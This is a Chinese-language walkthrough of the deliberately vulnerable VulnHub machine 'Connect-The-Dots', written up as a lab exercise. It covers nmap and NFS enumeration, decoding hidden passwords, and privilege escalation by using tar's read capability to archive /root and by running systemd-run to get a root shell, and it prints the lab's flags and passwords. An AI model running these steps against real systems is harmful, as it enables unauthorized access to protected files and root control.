# Connect-The-Dots主机渗透实现

- 靶机地址：https://www.vulnhub.com/entry/connect-the-dots-1,384/
- 下载地址：https://download.vulnhub.com/connectthedots/Connect-The-Dots.ova



## 信息收集：

### 主机发现

```shell
└─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24                            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 01:38 EDT
Nmap scan report for 192.168.2.1
Host is up (0.0094s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.2.6
Host is up (0.00027s latency).
MAC Address: 00:0C:29:2F:90:77 (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.000076s latency).
MAC Address: 00:50:56:E4:FB:DB (VMware)

```

### 端口扫描

- TCP扫描

- ```shell
  └─$ sudo nmap --min-rate 10000 -sT 192.168.2.6 -p- -oA Nmap-scan/sT        
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 01:39 EDT
  Nmap scan report for 192.168.2.6
  Host is up (0.0015s latency).
  Not shown: 65526 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  21/tcp    open  ftp
  80/tcp    open  http
  111/tcp   open  rpcbind
  2049/tcp  open  nfs
  7822/tcp  open  unknown
  34077/tcp open  unknown
  42993/tcp open  unknown
  45257/tcp open  unknown
  54639/tcp open  unknown
  MAC Address: 00:0C:29:2F:90:77 (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds
  ```

- UDP扫描

- ```shell
  └─$ sudo nmap --min-rate 10000 -sU 192.168.2.6 -p- -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 01:42 EDT
  Warning: 192.168.2.6 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.2.6
  Host is up (0.00090s latency).
  Not shown: 65450 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
  PORT      STATE SERVICE
  111/udp   open  rpcbind
  2049/udp  open  nfs
  5353/udp  open  zeroconf
  37514/udp open  unknown
  46095/udp open  unknown
  49704/udp open  unknown
  60198/udp open  unknown
  MAC Address: 00:0C:29:2F:90:77 (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 79.39 seconds
  
  ```

### 服务及操作系统扫描

- 提取端口：` cat Nmap-scan/sT.nmap | grep open |awk -F '/' '{print $1}' | tr '\n' ','`
- 设置变量：`export port=21,80,111,2049,7822,34077,42993,45257,54639 `

```shell
┌──(kali㉿kali)-[~/Desktop/walkthroughs/Connect-The-Dots]
└─$ cat Nmap-scan/sT.nmap | grep open |awk -F '/' '{print $1}' | tr '\n' ','
21,80,111,2049,7822,34077,42993,45257,54639,                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/walkthroughs/Connect-The-Dots]
└─$ export port=21,80,111,2049,7822,34077,42993,45257,54639 

└─$ sudo nmap --min-rate 10000 -sC -sV -O -p $port 192.168.2.6 -oA Nmap-scan/sC  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 02:23 EDT
Nmap scan report for 192.168.2.6
Host is up (0.00030s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 2.0.8 or later
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Landing Page
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34573/tcp6  mountd
|   100005  1,2,3      45458/udp6  mountd
|   100005  1,2,3      46095/udp   mountd
|   100005  1,2,3      54639/tcp   mountd
|   100021  1,3,4      34291/udp6  nlockmgr
|   100021  1,3,4      42993/tcp   nlockmgr
|   100021  1,3,4      45301/tcp6  nlockmgr
|   100021  1,3,4      60198/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7822/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA)
|   256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA)
|_  256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519)
34077/tcp open  mountd   1-3 (RPC #100005)
42993/tcp open  nlockmgr 1-4 (RPC #100021)
45257/tcp open  mountd   1-3 (RPC #100005)
54639/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 00:0C:29:2F:90:77 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds

```

### 基础漏洞扫描

```shell
└─$ sudo nmap --script=vuln -p$port 192.168.2.6 -oA Nmap-scan/Script 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 02:29 EDT
Nmap scan report for 192.168.2.6
Host is up (0.00030s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=S%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.2.6:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider
|_    http://192.168.2.6:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider
| http-enum: 
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /manual/: Potentially interesting folder
111/tcp   open  rpcbind
2049/tcp  open  nfs
7822/tcp  open  unknown
34077/tcp open  unknown
42993/tcp open  unknown
45257/tcp open  unknown
54639/tcp open  unknown
MAC Address: 00:0C:29:2F:90:77 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 37.43 seconds
```



### nfs目录

- `showmont -e 192.168.2.6` 查看当前主机挂载目录
- `mount -t nfs 192.168.2.6:/home/morris tmp`将目录挂载到本地

- 通过查看文件只有`.ssh`目录下存在公钥和私钥，尝试使用ssh进行登录，访问拒绝

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/Connect-The-Dots]
  └─$ cd tmp                    
  
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/Connect-The-Dots/tmp]
  └─$ ls
  Templates
  
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/Connect-The-Dots/tmp]
  └─$ ls -lhai
  total 56K
   131648 drwxr-xr-x  8 kali kali 4.0K Oct 11  2019 .
  4456915 drwxr-xr-x  4 kali kali 4.0K Aug 18 01:54 ..
   179003 -rw-------  1 kali kali    1 Oct 11  2019 .bash_history
   134179 -rw-r--r--  1 kali kali  220 Oct 10  2019 .bash_logout
   134178 -rw-r--r--  1 kali kali 3.5K Oct 10  2019 .bashrc
   179000 drwx------  9 kali kali 4.0K Oct 10  2019 .cache
   179011 drwx------ 10 kali kali 4.0K Oct 11  2019 .config
   178998 drwx------  3 kali kali 4.0K Oct 10  2019 .gnupg
   179012 -rw-------  1 kali kali 1.9K Oct 11  2019 .ICEauthority
   179032 drwx------  3 kali kali 4.0K Oct 10  2019 .local
   134182 -rw-r--r--  1 kali kali  807 Oct 10  2019 .profile
   179139 drwx------  2 kali kali 4.0K Oct 10  2019 .ssh
   179081 drwxr-xr-x  2 kali kali 4.0K Oct 10  2019 Templates
   179097 -rw-------  1 kali kali   52 Oct 10  2019 .Xauthority
                                                                 
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/Connect-The-Dots/tmp]
  └─$ cd .ssh                                 
                                                 
  ┌──(kali㉿kali)-[~/…/walkthroughs/Connect-The-Dots/tmp/.ssh]
  └─$ ssh -i id_rsa morris@192.168.2.6 -p 7822
  morris@192.168.2.6's password: 
  ```

## web发现

- 使用`gobuster`进行扫描

- ```shell
  └─$ sudo gobuster dir -u http://192.168.2.6/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,
  ===============================================================
  Gobuster v3.5
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.2.6/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.5
  [+] Extensions:              rar,zip,txt,php,tar
  [+] Timeout:                 10s
  ===============================================================
  2023/08/18 03:20:01 Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 311] [--> http://192.168.2.6/images/]
  /manual               (Status: 301) [Size: 311] [--> http://192.168.2.6/manual/]
  /javascript           (Status: 301) [Size: 315] [--> http://192.168.2.6/javascript/]
  /hits.txt             (Status: 200) [Size: 44]
  /backups              (Status: 200) [Size: 6301]
  /mysite               (Status: 301) [Size: 311] [--> http://192.168.2.6/mysite/]
  /server-status        (Status: 403) [Size: 299]
  Progress: 1322711 / 1323366 (99.95%)
  ===============================================================
  2023/08/18 03:22:52 Finished
  ===============================================================
  
  ```

- 查看`hits.txt`文件提示需要更多枚举... 

- 将backups文件下载后进行查看，没有找到有效信息

- 在`mysite`文件夹中发现存在一个cs文件，使用`jsfuck`语言进行编写，尝试删除无用字符后进行解析。

- 解析后获得字符串：`You're smart enough to understand me. Here's your secret, TryToGuessThisNorris@2k19`

- ![image-20230818154817361](https://raw.githubusercontent.com/r0o983/images/main/202308181548486.png)

### 获得初始shell

- 使用解析得到的字符串`TryToGuessThisNorris@2k19`尝试登录系统

- Ps:这里有个坑，之前查找到的`.ssh/id_rsa.pub`文件中的用户名是`morris`。后根据字符串中的用户名后尝试得以登陆成功。

- ```shell
  └─$ ssh norris@192.168.2.6 -p 7822          
  norris@192.168.2.6's password: 
  Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
  
  The programs included with the Debian GNU/Linux system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
  
  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  permitted by applicable law.
  
  ###
     #     #    #     #     #####     #      ##     #####     #    #    #   ####
     #     ##   #     #       #       #     #  #      #       #    ##   #  #    #
     #     # #  #     #       #       #    #    #     #       #    # #  #  #
     #     #  # #     #       #       #    ######     #       #    #  # #  #  ###
     #     #   ##     #       #       #    #    #     #       #    #   ##  #    #
    ###    #    #     #       #       #    #    #     #       #    #    #   ####
  
  Last login: Fri Aug 18 21:22:23 2023 from 192.168.2.2
  norris@sirrom:~$ id
  uid=1001(norris) gid=1001(norris) groups=1001(norris),27(sudo)
  norris@sirrom:~$ uname -a
  Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
  norris@sirrom:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:2f:90:77 brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.6/24 brd 192.168.2.255 scope global dynamic noprefixroute ens33
         valid_lft 1699sec preferred_lft 1699sec
      inet6 fe80::20c:29ff:fe2f:9077/64 scope link noprefixroute 
         valid_lft forever preferred_lft forever
  norris@sirrom:~$ cat 
  .bash_history  .bashrc        .gnupg/        .profile       
  .bash_logout   ftp/           .local/        user.txt       
  norris@sirrom:~$ cat user.txt 
  2c2836a138c0e7f7529aa0764a6414d0
  norris@sirrom:~$ 
  ```



## 提权

- 当前用户存在ftp文件夹，使用之前得到的账号密码来进行登录并获取文件

- 参数：`prompt` 下载多个文件时不需要询问

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/Connect-The-Dots]
  └─$ ftp 192.168.2.6               
  Connected to 192.168.2.6.
  220 Welcome to Heaven!
  Name (192.168.2.6:kali): norris
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> ls
  229 Entering Extended Passive Mode (|||62354|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 1001     1001         4096 Aug 18 21:35 files
  226 Directory send OK.
  ftp> cd files
  250 Directory successfully changed.
  ftp> ls
  229 Entering Extended Passive Mode (|||16476|)
  150 Here comes the directory listing.
  -r--------    1 1001     1001         6301 Oct 11  2019 backups.bak
  -r--------    1 1001     1001        39610 Oct 11  2019 game.jpg.bak
  -r--------    1 1001     1001           29 Aug 18 21:35 hits.txt
  -r--------    1 1001     1001           29 Oct 11  2019 hits.txt.bak
  -r--------    1 1001     1001       932659 Oct 11  2019 m.gif.bak
  226 Directory send OK.
  ftp> binary 
  200 Switching to Binary mode.
  ftp> prompt 
  Interactive mode off.
  ftp> mget *.*
  local: backups.bak remote: backups.bak
  229 Entering Extended Passive Mode (|||16844|)
  150 Opening BINARY mode data connection for backups.bak (6301 bytes).
  100% |***********************************************************************|  6301      115.55 MiB/s    00:00 ETA
  226 Transfer complete.
  6301 bytes received in 00:00 (10.25 MiB/s)
  local: game.jpg.bak remote: game.jpg.bak
  229 Entering Extended Passive Mode (|||31979|)
  150 Opening BINARY mode data connection for game.jpg.bak (39610 bytes).
  100% |***********************************************************************| 39610      258.73 MiB/s    00:00 ETA
  226 Transfer complete.
  39610 bytes received in 00:00 (62.43 MiB/s)
  local: hits.txt remote: hits.txt
  229 Entering Extended Passive Mode (|||15907|)
  150 Opening BINARY mode data connection for hits.txt (29 bytes).
  100% |***********************************************************************|    29      809.15 KiB/s    00:00 ETA
  226 Transfer complete.
  29 bytes received in 00:00 (57.67 KiB/s)
  local: hits.txt.bak remote: hits.txt.bak
  229 Entering Extended Passive Mode (|||58613|)
  150 Opening BINARY mode data connection for hits.txt.bak (29 bytes).
  100% |***********************************************************************|    29      809.15 KiB/s    00:00 ETA
  226 Transfer complete.
  29 bytes received in 00:00 (50.66 KiB/s)
  local: m.gif.bak remote: m.gif.bak
  229 Entering Extended Passive Mode (|||14382|)
  150 Opening BINARY mode data connection for m.gif.bak (932659 bytes).
  100% |***********************************************************************|   910 KiB   47.80 MiB/s    00:00 ETA
  226 Transfer complete.
  932659 bytes received in 00:00 (46.47 MiB/s)
  ftp> bye
  221 Goodbye.
  ```

- 将文件全部下载之后发现下载的`game.jpg.bak`和之前在网页上下载的`game.jpg`内容不一致，多了一个`comment`,尝试将内容进行解密

- 在线工具：[点我](https://www.boxentriq.com/code-breaking/morse-code),解密后获得字符串：

- `HEY#NORRIS,#YOU'VE#MADE#THIS#FAR.#FAR#FAR#FROM#HEAVEN#WANNA#SEE#HELL#NOW?#HAHA#YOU#SURELY#MISSED#ME,#DIDN'T#YOU?#OH#DAMN#MY#BATTERY#IS#ABOUT#TO#DIE#AND#I#AM#UNABLE#TO#FIND#MY#CHARGER#SO#QUICKLY#LEAVING#A#HINT#IN#HERE#BEFORE#THIS#SYSTEM#SHUTS#DOWN#AUTOMATICALLY.#I#AM#SAVING#THE#GATEWAY#TO#MY#DUNGEON#IN#A#'SECRETFILE'#WHICH#IS#PUBLICLY#ACCESSIBLE.`

- 根据提示，当前用户`norris`正在操作文件，但是系统突然关机或断电，尝试在系统中寻找`swp`文件

- ```shell
  norris@sirrom:~$ find / -name "*.swp" -type f 2>/dev/null
  /var/www/html/.secretfile.swp
  norris@sirrom:~$ cat /var/www/html/.secretfile.swp 
  cat: /var/www/html/.secretfile.swp: Permission denied
  norris@sirrom:~$ cd /var/www/html/
  norris@sirrom:/var/www/html$ ls -lhai
  total 368K
  264592 drwxr-xr-x 4 root     root     4.0K Oct 11  2019 .
  264591 drwxr-xr-x 3 root     root     4.0K Oct 11  2019 ..
  312910 -rw-r--r-- 1 www-data www-data 6.2K Oct 11  2019 backups
  312911 -rw-r--r-- 1 www-data www-data  325 Oct 11  2019 backups.html
  312916 -rw-r--r-- 1 www-data www-data  77K Oct 10  2019 bootstrap.bundle.min.js
  312918 -rw-r--r-- 1 www-data www-data 153K Oct 10  2019 bootstrap.min.css
  312909 -rw-r--r-- 1 www-data www-data   44 Oct 11  2019 hits.txt
  312905 drwxr-xr-x 2 www-data www-data 4.0K Oct 11  2019 images
  312904 -rw-r--r-- 1 www-data www-data 2.2K Oct 11  2019 index.htm
  266382 -rw-r--r-- 1 www-data www-data 2.0K Oct 11  2019 index.html
  312919 -rw-r--r-- 1 www-data www-data  70K Oct 10  2019 jquery.slim.min.js
  312880 -rw-r--r-- 1 www-data www-data  879 Oct 11  2019 landing.css
  312866 drwxr-xr-x 2 www-data www-data 4.0K Oct 11  2019 mysite
  312922 -rw-r--r-- 1 www-data www-data   99 Oct 11  2019 secretfile
  312917 -rw------- 1 www-data www-data  12K Oct 11  2019 .secretfile.swp
  norris@sirrom:/var/www/html$ cat secretfile 
  I see you're here for the password. Holy Moly! Battery is dying !! Mentioning below for reference.
  norris@sirrom:/var/www/html$ 
  ```

- 由于在当前系统中权限不足，将文件下载到本地来进行查看。

- ```shell
  └─$ wget http://192.168.2.6/.secretfile.swp
  --2023-08-18 04:34:08--  http://192.168.2.6/.secretfile.swp
  Connecting to 192.168.2.6:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 12288 (12K)
  Saving to: ‘.secretfile.swp’
  
  .secretfile.swp              100%[==============================================>]  12.00K  --.-KB/s    in 0s      
  
  2023-08-18 04:34:08 (383 MB/s) - ‘.secretfile.swp’ saved [12288/12288]
  
                                                                                                                      
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/Connect-The-Dots]
  └─$ strings .secretfile.swp 
  b0VIM 8.1
  root
  sirrom
  /var/www/html/secretfile
  U3210
  #"! 
  blehguessme090 
  I see you're here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..
  ```

- 使用`vim -r .secretfile.swp`来进行读取当前`swp`文件

- ![image-20230818163939437](https://raw.githubusercontent.com/r0o983/images/main/202308181639478.png)

- 当前用户无法使用`sudo -l `也没有定时任务，尝试使用刚才获得的字符串来切换到其他用户(`morris`:blehguessme090)

- ```shell
  └─$ ssh morris@192.168.2.6 -p 7822          
  morris@192.168.2.6's password: 
  Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
  
  The programs included with the Debian GNU/Linux system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
  
  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  permitted by applicable law.
  
  ###
     #     #    #     #     #####     #      ##     #####     #    #    #   ####
     #     ##   #     #       #       #     #  #      #       #    ##   #  #    #
     #     # #  #     #       #       #    #    #     #       #    # #  #  #
     #     #  # #     #       #       #    ######     #       #    #  # #  #  ###
     #     #   ##     #       #       #    #    #     #       #    #   ##  #    #
    ###    #    #     #       #       #    #    #     #       #    #    #   ####
  
  morris@sirrom:~$ sudo -l
  [sudo] password for morris: 
  Sorry, user morris may not run sudo on sirrom.
  morris@sirrom:~$ 
  ```

- `morris`用户并没有什么有效信息，切换回`norris`用户

### 获取root.flag

- 查看当前用户是否具有`getcap`权限

- Ps:``getcap` 是一个 Linux 命令，用于获取文件或目录的能力(capability)信息。Linux 能力是一种安全机制，允许程序或进程在不需要完全 root 权限的情况下执行一些特定的操作。这使得系统能够更细粒度地控制权限，以提高安全性。`getcap` 命令允许您查看已分配给文件或目录的能力。

- ```shell
  norris@sirrom:/var/www/html$ /sbin/getcap -r / 2>/dev/null 
  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
  /usr/bin/tar = cap_dac_read_search+ep
  /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
  /usr/bin/ping = cap_net_raw+ep
  ```

- 尝试使用`tar`将`root`目录进行打包

- ```shell
  norris@sirrom:/var/www/html$ cd ~
  
  ## 使用参数-zcvf将文件进行打包
  norris@sirrom:~$ tar -zcvf root.tar.gz /root
  tar: Removing leading `/' from member names
  /root/
  /root/root.txt
  /root/.bashrc
  /root/.gnupg/
  /root/.gnupg/private-keys-v1.d/
  /root/.bash_history
  /root/.cache/
  /root/.local/
  /root/.local/share/
  /root/.local/share/nano/
  /root/.profile
  norris@sirrom:~$ ls
  ftp  root.tar.gz  user.txt
  
  ## 使用-zxvf将得到的文件进行解压
  norris@sirrom:~$ tar -zxvf root.tar.gz 
  root/
  root/root.txt
  root/.bashrc
  root/.gnupg/
  root/.gnupg/private-keys-v1.d/
  root/.bash_history
  root/.cache/
  root/.local/
  root/.local/share/
  root/.local/share/nano/
  root/.profile
  norris@sirrom:~$ cat root/root.txt 
  8fc9376d961670ca10be270d52eda423
  norris@sirrom:~$ 
  ```



### 使用systemd-run提权

- 查找具有s位的文件进行提权

- ```shell
  norris@sirrom:~$ find / -perm -u=s -type f 2>/dev/null 
  /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
  /usr/lib/xorg/Xorg.wrap
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/openssh/ssh-keysign
  /usr/sbin/pppd
  /usr/sbin/mount.nfs
  /usr/bin/gpasswd
  /usr/bin/umount
  /usr/bin/newgrp
  /usr/bin/passwd
  /usr/bin/fusermount
  /usr/bin/chfn
  /usr/bin/bwrap
  /usr/bin/mount
  /usr/bin/su
  /usr/bin/pkexec
  /usr/bin/ntfs-3g
  /usr/bin/chsh
  /usr/bin/sudo
  norris@sirrom:~$ 
  
  ```

- 使用`systemd-run -t` 启动一个新的`bash`环境

  - 参数：-t	启动一个新的伪终端

- ```shell
  norris@sirrom:~$ ls -lhai /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper 
  36340 -rwsr-xr-x 1 root root 18K Sep  8  2018 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
  norris@sirrom:~$ systemd-run -t /bin/bash
  ==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
  Authentication is required to manage system services or other units.                                                
  Authenticating as: norris,,, (norris)
  Password: 
  ==== AUTHENTICATION COMPLETE ===
  Running as unit: run-u98.service                                                                                    
  Press ^] three times within 1s to disconnect TTY.
  root@sirrom:/# whoami
  root
  root@sirrom:/# ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:2f:90:77 brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.6/24 brd 192.168.2.255 scope global dynamic noprefixroute ens33
         valid_lft 1453sec preferred_lft 1453sec
      inet6 fe80::20c:29ff:fe2f:9077/64 scope link noprefixroute 
         valid_lft forever preferred_lft forever
  root@sirrom:/# uname -a
  Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
  root@sirrom:/# cd /root/
  root@sirrom:/root# cat 
  .bash_history  .bashrc        .cache/        .gnupg/        .local/        .profile       root.txt
  root@sirrom:/root# cat root.txt 
  8fc9376d961670ca10be270d52eda423
  root@sirrom:/root# 
  
  ```

- 
